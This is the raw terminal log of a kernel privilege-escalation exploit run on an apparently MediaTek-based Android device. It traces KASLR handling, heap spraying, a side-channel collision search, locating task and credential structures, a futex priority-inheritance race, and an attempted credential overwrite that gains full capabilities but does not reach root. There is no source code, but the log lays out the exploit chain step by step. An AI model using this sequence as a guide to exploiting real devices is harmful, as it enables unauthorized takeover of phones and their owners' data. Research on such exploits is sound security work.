[32m[+] [0mpreload starting pid=14405
[32m[+] [0mstartup context pid=14405 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=14405 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=14405 label=matisse_os2.0.6.0_ulkcnxm slide=pselect main=pselect
[32m[+] [0mp0 profile pid=14405 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80027913a0 bootid_data=ffffff80028a77d0 init_task=ffffff800279bec0 root_tg=ffffff8002992040 sysctl_bootid=ffffff8002a60bb5
[33m[*] [0mmt16: skipping SLIDE warmup per PSELECT_SKIP_WARMUP
[32m[+] [0mslide-kaslr-mtk-hardcoded pid=14405 base=ffffffc008000000 slide=0000000000000000 warmup=0
[33m[*] [0mmt19: SLIDE trigger route (real CVE path)
[33m[*] [0mmt28c: CRED overwrite mode
[33m[*] [0mprepare_kernel_page enter: payload=1 (0=FOPS,1=SLIDE)
[33m[*] [0mprepare_kernel_page: ctxs ready, cloning 272 prepare + 204 spray + 33 pre + 34 post...
[33m[*] [0mprepare_kernel_page: prepare+spray children cloned, now spray...
[33m[*] [0mprepare_kernel_page: spray children done, setup KernelSnitch...
[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[33m[*] [0mmt18-diag: ks_setup done
[33m[*] [0mmt18-diag: pre clones done
[33m[*] [0mmt18-diag: leak child forked
[33m[*] [0mmt18-diag: post clones done
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    000000790745d0c8
[33m[*] [0mmt47-c: leak pin via SCM_RIGHTS OK (fd=517)
[33m[*] [0mmt18-diag: memfds opened
[33m[*] [0mmt18-diag: pre children killed
[33m[*] [0m  00000070828499b8
[33m[*] [0m  0000007082b5e260
[33m[*] [0m  0000007082ee5e98
[33m[*] [0mfound 3 collisisons
[33m[*] [0mmt18-diag: post children killed
[33m[*] [0mmt18-diag: spray children killed
[33m[*] [0mmt18-diag: leak child reaped (attempt 1)
[33m[*] [0mprepare_kernel_page: checking KernelSnitch collisions...
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
[33m[*] [0m[  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
[33m[*] [0m[  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
[33m[*] [0m[  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
[33m[*] [0m[  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
[33m[*] [0m[  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
[33m[*] [0m[  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
[33m[*] [0mprepare_kernel_page: SKB reclaim sends (2 rounds)...
[33m[*] [0mdone
[33m[*] [0mmt19: SLIDE page prepared base=0xffffff801d2e8000
[33m[*] [0mmt28c: perf task=0xffffff80fab2dc80 (232/256 votes)
[33m[*] [0mmt39: cred_cand=ffffff813ed2f840 votes=24 (task=ffffff80fab2dc80 diff=+1142954944
[33m[*] [0mmt40: task=ffffff80fab2dc80 cred_addr=ffffff813ed2f840 uid_ptr=ffffff813ed2f840
[33m[*] [0mmt48: PTR stage=R task=ffffff80fab2dc80 pc=ffffff80fab2e3f0 right=ffffff80027b0ae0 [PTR_RIGHT override] (STORE(a)→[task+0x778 real_cred])
[33m[*] [0mmt28m: cred write attempt 1/1 fake_cred=ffffff80027b0ae0
[33m[*] [0mmt33: child pid=17615 task=ffffff80fab2dc80 blocking-for-cred-write
[33m[*] [0mmt59: owner armed - blocking on chain mutex
[33m[*] [0mmt60: pre-requeue words f_wait=0 target=17617 chain=2147501264
[33m[*] [0mmt59: requeue fired ret=-1 errno=35
[33m[*] [0mmt60: waiter FWRQ ret=-1 errno=110 (0=拿锁 ETIMEDOUT=110 超时醒 EAGAIN=11 未阻塞) wake_secs=3
[33m[*] [0mmt60: waiter UNLOCK_PI(chain) ret=0 errno=0
[33m[*] [0mmt61: pselect window=20s (mt60 时代为 2s 死值) mt66: watchdog=28s shots=6 enter_delay=50000usec t=0ms
[33m[*] [0mmt60: owner chain LOCK_PI ret=0 errno=0 (woken)
[33m[*] [0mmt47: alive poll=50 uid=2000 CapEff=0000000000000000
[33m[*] [0mmt47: alive poll=100 uid=2000 CapEff=0000000000000000
[33m[*] [0mmt19b: sched attempt=0 tid=17616 ret=0 errno=0 t=17567ms
[33m[*] [0mmt25: futex trigger 0 ret=-1 errno=110 t=17568ms
[33m[*] [0mmt25: futex trigger 1 ret=-1 errno=110 t=17588ms
[33m[*] [0mmt51: mid-burst landing (CapEff=000001ffffffffff root=0) - abort shots ti=2
[33m[*] [0mmt66: window wake armed ret=0 errno=0 (storm done at t=17608ms)
[33m[*] [0mslide pselect returned ret=6 errno=0 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0 t=17609ms
[31m[-] [0mslide bad leaked pointer=964afa2dd3841cbf
[31m[!] [0mmt28c: no root after 1 attempts
[33m[*] [0mmt47: alive poll=150 uid=2000 CapEff=000001ffffffffff
[33m[*] [0mmt47: alive poll=200 uid=2000 CapEff=000001ffffffffff
[33m[*] [0mmt47: alive poll=250 uid=2000 CapEff=000001ffffffffff
[33m[*] [0mmt47: alive poll=300 uid=2000 CapEff=000001ffffffffff
[33m[*] [0mmt47: alive poll=350 uid=2000 CapEff=000001ffffffffff
[33m[*] [0mmt47: alive poll=400 uid=2000 CapEff=000001ffffffffff
